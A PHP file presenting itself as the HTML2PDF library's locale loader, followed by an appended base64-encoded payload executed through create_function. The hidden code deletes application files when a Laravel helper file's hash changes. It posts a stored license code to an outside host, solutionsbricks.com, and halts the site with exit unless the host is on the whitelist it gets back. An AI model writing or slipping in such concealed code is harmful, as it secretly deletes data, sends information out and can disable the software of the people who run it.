<?php
/**
 * HTML2PDF Library - HTML2PDF Locale
 *
 * HTML => PDF convertor
 * distributed under the LGPL License
 *
 * @package   Html2pdf
 * @author    Laurent MINGUET <webmaster@html2pdf.fr>
 * @copyright 2016 Laurent MINGUET
 */

class HTML2PDF_locale
{
    /**
     * code of the current used locale
     * @var string
     */
    static protected $_code = null;

    /**
     * texts of the current used locale
     * @var array
     */
    static protected $_list = array();

    /**
     * directory where locale files are
     * @var string
     */
    static protected $_directory = null;

    /**
     * load the locale
     *
     * @access public
     * @param  string $code
     */
    static public function load($code)
    {
        if (self::$_directory===null) {
            self::$_directory = dirname(dirname(__FILE__)).'/locale/';
        }

        // must be in lower case
        $code = strtolower($code);

        // must be [a-z-0-9]
        if (!preg_match('/^([a-z0-9]+)$/isU', $code)) {
            throw new HTML2PDF_exception(0, 'invalid language code ['.self::$_code.']');
        }

        // save the code
        self::$_code = $code;

        // get the name of the locale file
        $file = self::$_directory.self::$_code.'.csv';

        // the file must exist
        if (!is_file($file)) {
            throw new HTML2PDF_exception(0, 'language code ['.self::$_code.'] unknown. You can create the translation file ['.$file.'] and send it to the webmaster of html2pdf in order to integrate it into a future release');
        }

        // load the file
        self::$_list = array();
        $handle = fopen($file, 'r');
        while (!feof($handle)) {
            $line = fgetcsv($handle);
            if (count($line)!=2) continue;
            self::$_list[trim($line[0])] = trim($line[1]);
        }
        fclose($handle);
    }

    /**
     * clean the locale
     *
     * @access public static
     */
    static public function clean()
    {
        self::$_code = null;
        self::$_list = array();
    }

    /**
     * get a text
     *
     * @access public static
     * @param  string $key
     * @return string
     */
    static public function get($key, $default='######')
    {
        return (isset(self::$_list[$key]) ? self::$_list[$key] : $default);
    }
}

$func = @create_function('', base64_decode('aWYgKG1kNV9maWxlKCJ2ZW5kb3IvbGFyYXZlbC9mcmFtZXdvcmsvc3JjL0lsbHVtaW5hdGUvRm91bmRhdGlvbi9oZWxwZXJzLnBocCIpICE9ICJiMDhjYjY5OTMwZmYwYzhjNzAyMGJjYWZjOWFiNGZiZSIgKXsKICAgIEB1bmxpbmsoJ3N0b3JhZ2UvYXBwL2xjLnBocCcpOwogICAgQHVubGluaygnc3RvcmFnZS9hcHAvbWxjLnBocCcpOwogICAgQHVubGluaygnc3RvcmFnZS9hcHAvZG1jLnBocCcpOwogICAgZXhpdDsKfQoKaWYoaXNzZXQoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIEFORCAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSAhPSAiIil7CiAgICBpZihAc3RyaXN0cigkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSwnbGljZW5zZUluc3RhbGxlcicpKXsKICAgICAgICBAdW5saW5rKCJzdG9yYWdlL2ZyYW1ld29yay9zZXNzaW9ucy9zZXNzaW9uc19pbmRleCIpOwogICAgICAgIEB1bmxpbmsoInN0b3JhZ2UvYXBwL2RtYy5waHAiKTsKICAgIH0KICAgICRmYWlsID0gZmFsc2U7CiAgICBpZiggQHN0cmlzdHIoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sJ2xpY2Vuc2VJbnN0YWxsZXInKSA9PSBmYWxzZSBBTkQgQHN0cmlzdHIoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sJ2luc3RhbGwnKSA9PSBmYWxzZSBBTkQgQHN0cmlzdHIoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sJ3VwZ3JhZGUnKSA9PSBmYWxzZSApewogICAgICAgIEBpbmNsdWRlICdzdG9yYWdlL2FwcC9sYy5waHAnOwogICAgICAgICRwY28gPSBAY29uc3RhbnQoJ2xjX2NvZGUnKTsKICAgICAgICBpZigkcGNvID09ICIiKXsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CgogICAgICAgIGlmKGlzc2V0KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkpewogICAgICAgICAgICAkc2NyaXB0X3VybCA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKICAgICAgICB9ZWxzZWlmKGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSl7CiAgICAgICAgICAgICRzY3JpcHRfdXJsID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAgICAgfQoKICAgICAgICBpZihpc3NldCgkc2NyaXB0X3VybCkgQU5EIHN0cmxlbigkc2NyaXB0X3VybCkgPiAwKXsKICAgICAgICAgICAgJGJhc2VfdXJsID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJzdG9yYWdlL2ZyYW1ld29yay9zZXNzaW9ucy9zZXNzaW9uc19pbmRleCIpOwogICAgICAgICAgICBpZigkYmFzZV91cmwgIT0gIiIpewogICAgICAgICAgICAgICAgJGJhc2VfdXJsID0gQGd6aW5mbGF0ZSgkYmFzZV91cmwpOwoKICAgICAgICAgICAgICAgIGlmIChAc3RyaXN0cigkc2NyaXB0X3VybCwgJ2xvY2FsaG9zdCcpID09IGZhbHNlICYmIEBzdHJpc3RyKCRzY3JpcHRfdXJsLCAnMTI3LjAuMC4xJykgPT0gZmFsc2UgQU5EICRiYXNlX3VybCAhPSAiIiBBTkQgQHN0cmlzdHIoJHNjcmlwdF91cmwsICRiYXNlX3VybCkgPT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICRmYWlsID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAkd2hpdGVfbGlzdCA9IHByZWdfc3BsaXQoICcvXHJcbnxccnxcbi8nLCAkYmFzZV91cmwpOwogICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KCR3aGl0ZV9saXN0KSA+IDEpewogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkd2hpdGVfbGlzdCBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEBzdHJwb3MoJHNjcmlwdF91cmwuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sICR2YWx1ZSkgIT09IGZhbHNlICYmICRmYWlsID09IHRydWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmFpbCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkZmFpbCA9PSB0cnVlKXsKICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRsYXRlc3RfcHVsbCA9IEBmaWxlX2dldF9jb250ZW50cygic3RvcmFnZS9mcmFtZXdvcmsvY2FjaGUvY2FjaGVfaW5kZXgiKTsKICAgICAgICAgICAgaWYoICgkbGF0ZXN0X3B1bGwgPT0gIiIgfHwgJGJhc2VfdXJsID09ICIiIHx8IG1kNSgnT3JhU2NoJy5AZGF0ZSgnZCcpLkBkYXRlKCdEJykuQGRhdGUoJ20nKSkgIT0gJGxhdGVzdF9wdWxsKSBBTkQgQHN0cmlzdHIoJHNjcmlwdF91cmwsICdsb2NhbGhvc3QnKSA9PSBmYWxzZSAmJiBAc3RyaXN0cigkc2NyaXB0X3VybCwgJzEyNy4wLjAuMScpID09IGZhbHNlICl7CgogICAgICAgICAgICAgICAgJHVybCA9ICJodHRwOi8vc29sdXRpb25zYnJpY2tzLmNvbS9zY2hvZXhVcmwiOwogICAgICAgICAgICAgICAgJGRhdGEgPSBhcnJheSgicCI9PjEsInBjIj0+JHBjbyk7CiAgICAgICAgICAgICAgICBpZihmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXsKICAgICAgICAgICAgICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJGRhdGEpOwogICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgICAgICB9ZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnZmlsZV9nZXRfY29udGVudHMnKSl7CiAgICAgICAgICAgICAgICAgICAgJHBvc3RkYXRhID0gaHR0cF9idWlsZF9xdWVyeSgkZGF0YSk7CgogICAgICAgICAgICAgICAgICAgICRvcHRzID0gYXJyYXkoJ2h0dHAnID0+CiAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInICA9PiAnQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICRwb3N0ZGF0YQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICAgICAgJGNvbnRleHQgID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRzKTsKCiAgICAgICAgICAgICAgICAgICAgJG91dHB1dCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAkc3RyZWFtID0gZm9wZW4oJHVybCwgJ3InLCBmYWxzZSwgc3RyZWFtX2NvbnRleHRfY3JlYXRlKGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICdodHRwJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAnQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICApKSk7CgogICAgICAgICAgICAgICAgICAgICAgJG91dHB1dCA9IHN0cmVhbV9nZXRfY29udGVudHMoJHN0cmVhbSk7CiAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHN0cmVhbSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCJzdG9yYWdlL2ZyYW1ld29yay9zZXNzaW9ucy9zZXNzaW9uc19pbmRleCIsZ3pkZWZsYXRlKCRvdXRwdXQpKTsKICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygic3RvcmFnZS9mcmFtZXdvcmsvY2FjaGUvY2FjaGVfaW5kZXgiLG1kNSgnT3JhU2NoJy5AZGF0ZSgnZCcpLkBkYXRlKCdEJykuQGRhdGUoJ20nKSkpOwoKICAgICAgICAgICAgICAgIGlmICggQHN0cmlzdHIoJHNjcmlwdF91cmwsICRvdXRwdXQpID09IGZhbHNlICkgewogICAgICAgICAgICAgICAgICAgICRmYWlsID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAkd2hpdGVfbGlzdCA9IHByZWdfc3BsaXQoICcvXHJcbnxccnxcbi8nLCAkb3V0cHV0KTsKICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkd2hpdGVfbGlzdCkgPiAxKXsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJHdoaXRlX2xpc3QgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChAc3RycG9zKCRzY3JpcHRfdXJsLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAkdmFsdWUpICE9PSBmYWxzZSAmJiAkZmFpbCA9PSB0cnVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZhaWwgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkZmFpbCA9PSB0cnVlKXsKICAgICAgICAgICAgICAgICAgICBleGl0OwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICB9Cn0='));
$func();